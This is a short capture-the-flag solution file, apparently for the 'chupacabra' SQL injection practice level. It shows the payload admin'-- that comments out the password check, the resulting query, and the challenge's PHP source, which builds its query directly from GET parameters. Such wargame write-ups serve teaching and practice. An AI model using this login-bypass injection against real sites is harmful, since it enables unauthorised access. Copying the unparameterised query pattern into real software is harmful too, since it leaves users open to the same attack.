@@ -1,0 +1,15 @@
+?id=admin'--
+
+query : select id from member where id='admin'--' and pw=''
+CHUPACABRA Clear!
+http://www.wechall.net
+<?php
+  include "./config.php";
+  login_chk();
+  $db = sqlite_open("./db/chupacabra.db");
+  $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = sqlite_fetch_array(sqlite_query($db,$query));
+  if($result['id'] == "admin") solve("chupacabra");
+  highlight_file(__FILE__);
+?>
